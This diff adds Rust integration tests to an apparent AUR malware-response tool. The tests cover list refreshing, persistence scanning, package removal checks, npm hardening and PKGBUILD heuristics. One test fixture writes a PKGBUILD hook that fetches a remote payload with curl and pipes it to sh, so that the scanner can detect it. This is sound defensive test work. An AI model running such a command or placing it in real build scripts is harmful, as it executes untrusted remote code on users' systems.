@@ -295,6 +295,7 @@ fn remote_refresh_preserves_verified_bundled_baseline() {
     .unwrap();
     let bundled = lists.join("atomic-arch-pkgs.txt");
     fs::copy(upstream.join("data/lists/atomic-arch-pkgs.txt"), &bundled).unwrap();
+    let before = fs::read(&bundled).unwrap();
     let empty = home.path().join("empty.txt");
     let extra = home.path().join("extra.txt");
     let foreign = home.path().join("foreign.txt");
@@ -304,17 +305,20 @@ fn remote_refresh_preserves_verified_bundled_baseline() {
     fs::write(&extra, "remote-only-package\n").unwrap();
     fs::write(&foreign, "").unwrap();
 
-    let output = Command::new(binary())
-        .env("HOME", home.path())
-        .env("AUR_RESPONSE_DIR", home.path())
-        .env("AUR_LIST_URL_ARCH", format!("file://{}", empty.display()))
-        .env("AUR_LIST_URL_CSCS", format!("file://{}", empty.display()))
-        .env("AUR_LIST_URL_EXTRA", format!("file://{}", extra.display()))
-        .env("AUR_TEST_FOREIGN_LIST", foreign)
-        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
-        .args(["scan", "packages", "atomic-arch"])
-        .output()
-        .unwrap();
+    let run_online = || {
+        Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .env("AUR_LIST_URL_ARCH", format!("file://{}", empty.display()))
+            .env("AUR_LIST_URL_CSCS", format!("file://{}", empty.display()))
+            .env("AUR_LIST_URL_EXTRA", format!("file://{}", extra.display()))
+            .env("AUR_TEST_FOREIGN_LIST", &foreign)
+            .env("AUR_TEST_PACMAN_LOG_DIR", &logs)
+            .args(["scan", "packages", "atomic-arch", "--json"])
+            .output()
+            .unwrap()
+    };
+    let output = run_online();
 
     assert_eq!(
         output.status.code(),
@@ -323,9 +327,63 @@ fn remote_refresh_preserves_verified_bundled_baseline() {
         String::from_utf8_lossy(&output.stdout),
         String::from_utf8_lossy(&output.stderr)
     );
-    let refreshed = fs::read_to_string(bundled).unwrap();
+    assert_eq!(fs::read(&bundled).unwrap(), before);
+    assert!(!bundled.with_extension("previous.txt").exists());
+    let cache = home.path().join("reports/lists/atomic-arch-pkgs.txt");
+    let refreshed = fs::read_to_string(&cache).unwrap();
     assert!(refreshed.lines().any(|line| line == "123pan-bin"));
     assert!(refreshed.lines().any(|line| line == "remote-only-package"));
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
+    assert_eq!(
+        json["list_sha256"],
+        aur_response::report::sha256(&cache).unwrap()
+    );
+    assert_eq!(
+        json["campaigns"][0]["expected_list_sha256"],
+        aur_response::report::sha256(&bundled).unwrap()
+    );
+    let repeated = run_online();
+    assert_eq!(repeated.status.code(), Some(0));
+    let stdout = String::from_utf8(repeated.stdout).unwrap();
+    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
+    assert_eq!(json["list_added"], 0);
+    assert_eq!(json["list_removed"], 0);
+    let blocked_backup = cache.with_extension("previous.txt");
+    fs::remove_file(&blocked_backup).unwrap();
+    fs::create_dir(&blocked_backup).unwrap();
+    let failed = run_online();
+    assert_eq!(failed.status.code(), Some(3));
+    let stdout = String::from_utf8(failed.stdout).unwrap();
+    assert!(stdout.contains("cannot cache atomic-arch list"));
+    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
+    assert_eq!(json["coverage_complete"], false);
+    assert_eq!(
+        json["list_sha256"],
+        aur_response::report::sha256(&bundled).unwrap()
+    );
+    fs::remove_dir(blocked_backup).unwrap();
+    fs::write(&cache, "corrupted-cache\n").unwrap();
+    let local = Command::new(binary())
+        .env("HOME", home.path())
+        .env("AUR_RESPONSE_DIR", home.path())
+        .env("AUR_TEST_FOREIGN_LIST", &foreign)
+        .env("AUR_TEST_PACMAN_LOG_DIR", &logs)
+        .args(["scan", "packages", "atomic-arch", "--local", "--json"])
+        .output()
+        .unwrap();
+    assert_eq!(
+        local.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&local.stdout)
+    );
+    let stdout = String::from_utf8(local.stdout).unwrap();
+    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
+    assert_eq!(
+        json["list_sha256"],
+        aur_response::report::sha256(&bundled).unwrap()
+    );
 }
 
 #[test]
@@ -940,6 +998,8 @@ fn persistence_decode_and_size_failures_mark_coverage_incomplete() {
     fs::create_dir_all(&systemd).unwrap();
     fs::write(systemd.join("oversized.service"), vec![b'x'; 1_048_577]).unwrap();
     fs::write(home.path().join(".bashrc"), [0xff, 0xfe, 0xfd]).unwrap();
+    fs::create_dir_all(home.path().join("cron")).unwrap();
+    fs::write(home.path().join("cron/undecodable"), [0xff, 0xfe]).unwrap();
 
     let output = Command::new(binary())
         .env("HOME", home.path())
@@ -958,6 +1018,248 @@ fn persistence_decode_and_size_failures_mark_coverage_incomplete() {
     let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
     assert_eq!(json["coverage_complete"], false);
     assert_eq!(json["files_skipped_oversize"], 1);
-    assert_eq!(json["roots_unreadable"], 1);
+    assert_eq!(json["roots_unreadable"], 2);
     assert_eq!(json["artifact_critical"], 0);
+}
+
+#[test]
+fn explicit_removal_verification_reports_only_installed_targets() {
+    let home = tempdir().unwrap();
+    let foreign = home.path().join("foreign.txt");
+    fs::write(&foreign, "beef\n").unwrap();
+    for (targets, expected) in [(vec!["absent"], 0), (vec!["absent", "beef"], 1)] {
+        let output = Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .env("AUR_TEST_FOREIGN_LIST", &foreign)
+            .args(["recovery", "remove-packages", "--verify", "--local"])
+            .args(targets)
+            .output()
+            .unwrap();
+        assert_eq!(output.status.code(), Some(expected), "{output:?}");
+        let stdout = String::from_utf8(output.stdout).unwrap();
+        assert!(!stdout.contains("  - absent"), "{stdout}");
+        assert!(!stdout.contains("Command: sudo pacman"), "{stdout}");
+        if expected == 1 {
+            assert!(stdout.contains("1 Atomic Arch package(s)"), "{stdout}");
+            assert!(stdout.contains("  - beef"), "{stdout}");
+        }
+        assert_eq!(fs::read_to_string(&foreign).unwrap(), "beef\n");
+    }
+}
+
+#[test]
+fn hardening_preserves_unterminated_npm_configuration() {
+    let home = tempdir().unwrap();
+    let path = home.path().join(".npmrc");
+    fs::write(&path, "registry=https://example.invalid").unwrap();
+    let run = |apply: bool| {
+        let mut command = Command::new(binary());
+        command
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .args(["recovery", "apply-hardening"]);
+        if apply {
+            command.arg("--apply");
+        }
+        command.output().unwrap()
+    };
+    assert_eq!(run(false).status.code(), Some(0));
+    assert_eq!(
+        fs::read_to_string(&path).unwrap(),
+        "registry=https://example.invalid"
+    );
+    assert_eq!(run(true).status.code(), Some(0));
+    assert_eq!(
+        fs::read_to_string(&path).unwrap(),
+        "registry=https://example.invalid\nignore-scripts=true\n"
+    );
+    assert_eq!(run(true).status.code(), Some(0));
+    assert_eq!(
+        fs::read_to_string(&path).unwrap(),
+        "registry=https://example.invalid\nignore-scripts=true\n"
+    );
+}
+
+#[test]
+fn maintainer_comment_does_not_suppress_independent_hook_evidence() {
+    let home = tempdir().unwrap();
+    let cache = home.path().join("cache/package");
+    fs::create_dir_all(&cache).unwrap();
+    let comment = "# Maintainer: encoded contact base64 -d\n";
+    for (body, expected) in [
+        ("", 0),
+        (
+            "prepare() { curl https://example.invalid/payload | sh; }\n",
+            1,
+        ),
+    ] {
+        let input = format!("{comment}{body}");
+        fs::write(cache.join("PKGBUILD"), &input).unwrap();
+        let output = Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
+            .args(["scan", "similar-heuristics", "--local"])
+            .output()
+            .unwrap();
+        assert_eq!(output.status.code(), Some(expected), "{output:?}");
+        assert_eq!(fs::read_to_string(cache.join("PKGBUILD")).unwrap(), input);
+    }
+}
+
+#[test]
+fn report_publication_failure_is_not_silent_success() {
+    for blocked in ["directory", "state", "summary"] {
+        let home = tempdir().unwrap();
+        let reports = home.path().join("reports");
+        if blocked == "directory" {
+            fs::write(&reports, "preserve").unwrap();
+        } else {
+            fs::create_dir_all(&reports).unwrap();
+            fs::create_dir(reports.join(if blocked == "state" {
+                ".scan-state"
+            } else {
+                "latest-summary.json"
+            }))
+            .unwrap();
+        }
+        let output = Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .args(["recovery", "rotate-hints", "--quiet", "--json"])
+            .output()
+            .unwrap();
+        assert_eq!(output.status.code(), Some(3), "{blocked}: {output:?}");
+        assert!(String::from_utf8(output.stderr)
+            .unwrap()
+            .contains("cannot publish report"));
+        if blocked == "directory" {
+            assert_eq!(fs::read_to_string(&reports).unwrap(), "preserve");
+        }
+    }
+}
+
+#[test]
+fn heuristic_comment_filter_preserves_custom_pattern_line_endings() {
+    let home = tempdir().unwrap();
+    let cache = home.path().join("cache/package");
+    fs::create_dir_all(&cache).unwrap();
+    fs::write(cache.join("PKGBUILD"), "payload\n").unwrap();
+    let output = Command::new(binary())
+        .env("HOME", home.path())
+        .env("AUR_RESPONSE_DIR", home.path())
+        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
+        .env("AUR_SIMILAR_HEURISTICS_PATTERN", "(?s)payload\n$")
+        .args(["scan", "similar-heuristics", "--local"])
+        .output()
+        .unwrap();
+    assert_eq!(output.status.code(), Some(1), "{output:?}");
+}
+
+#[test]
+fn freshness_preserves_bundle_and_reports_installed_stale_misses() {
+    for (installed, expected) in [("fresh-package\n", 1), ("", 0)] {
+        let home = tempdir().unwrap();
+        let list = home.path().join("list.txt");
+        let remote = home.path().join("remote.txt");
+        let empty = home.path().join("empty.txt");
+        let foreign = home.path().join("foreign.txt");
+        fs::write(&list, "old-package\n").unwrap();
+        fs::write(&remote, "fresh-package\n").unwrap();
+        fs::write(&empty, "").unwrap();
+        fs::write(&foreign, installed).unwrap();
+        let output = Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .env("AUR_TEST_LIST_FILE", &list)
+            .env("AUR_LIST_URL_ARCH", format!("file://{}", empty.display()))
+            .env("AUR_LIST_URL_CSCS", format!("file://{}", empty.display()))
+            .env("AUR_LIST_URL_EXTRA", format!("file://{}", remote.display()))
+            .env("AUR_TEST_FOREIGN_LIST", &foreign)
+            .args(["check", "list-freshness", "--json"])
+            .output()
+            .unwrap();
+        assert_eq!(
+            output.status.code(),
+            Some(expected),
+            "{}",
+            String::from_utf8_lossy(&output.stdout)
+        );
+        assert_eq!(fs::read_to_string(&list).unwrap(), "old-package\n");
+        assert!(!list.with_extension("previous.txt").exists());
+        let stdout = String::from_utf8(output.stdout).unwrap();
+        assert_eq!(stdout.contains("[STALE-MISS] fresh-package"), expected == 1);
+        let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
+        assert_eq!(json["list_added"], 1);
+        assert_eq!(json["list_removed"], 1);
+        assert_eq!(json["coverage_complete"], true);
+        assert_eq!(json["findings"]["list_freshness_added"][0], "fresh-package");
+    }
+}
+
+#[test]
+fn freshness_requires_online_evidence_and_never_fetches_in_local_mode() {
+    let home = tempdir().unwrap();
+    let list = home.path().join("list.txt");
+    let empty = home.path().join("empty.txt");
+    let foreign = home.path().join("foreign.txt");
+    fs::write(&list, "old-package\n").unwrap();
+    fs::write(&empty, "").unwrap();
+    fs::write(&foreign, "").unwrap();
+    for local in [false, true] {
+        let mut command = Command::new(binary());
+        command
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .env("AUR_TEST_LIST_FILE", &list)
+            .env("AUR_LIST_URL_ARCH", format!("file://{}", empty.display()))
+            .env("AUR_LIST_URL_CSCS", format!("file://{}", empty.display()))
+            .env("AUR_LIST_URL_EXTRA", format!("file://{}", empty.display()))
+            .env("AUR_TEST_FOREIGN_LIST", &foreign)
+            .args(["check", "list-freshness", "--json"]);
+        if local {
+            command.arg("--local").env("PATH", home.path());
+        }
+        let output = command.output().unwrap();
+        assert_eq!(output.status.code(), Some(3));
+        let stdout = String::from_utf8(output.stdout).unwrap();
+        assert!(stdout.contains(if local {
+            "online freshness is unavailable in --local mode"
+        } else {
+            "fresh package list is empty or unavailable"
+        }));
+        let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
+        assert_eq!(json["coverage_complete"], false);
+        assert_eq!(fs::read_to_string(&list).unwrap(), "old-package\n");
+    }
+}
+
+#[test]
+fn freshness_missing_inventory_reports_incomplete_coverage() {
+    let home = tempdir().unwrap();
+    let list = home.path().join("list.txt");
+    let remote = home.path().join("remote.txt");
+    fs::write(&list, "old-package\n").unwrap();
+    fs::write(&remote, "fresh-package\n").unwrap();
+    let output = Command::new(binary())
+        .env("HOME", home.path())
+        .env("AUR_RESPONSE_DIR", home.path())
+        .env("AUR_TEST_LIST_FILE", &list)
+        .env("AUR_LIST_URL_ARCH", format!("file://{}", remote.display()))
+        .env("AUR_LIST_URL_CSCS", format!("file://{}", remote.display()))
+        .env("AUR_LIST_URL_EXTRA", format!("file://{}", remote.display()))
+        .env(
+            "AUR_TEST_FOREIGN_LIST",
+            home.path().join("absent-inventory"),
+        )
+        .args(["check", "list-freshness", "--json"])
+        .output()
+        .unwrap();
+    assert_eq!(output.status.code(), Some(3));
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("could not query installed foreign packages"));
+    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
+    assert_eq!(json["coverage_complete"], false);
+    assert_eq!(fs::read_to_string(list).unwrap(), "old-package\n");
 }
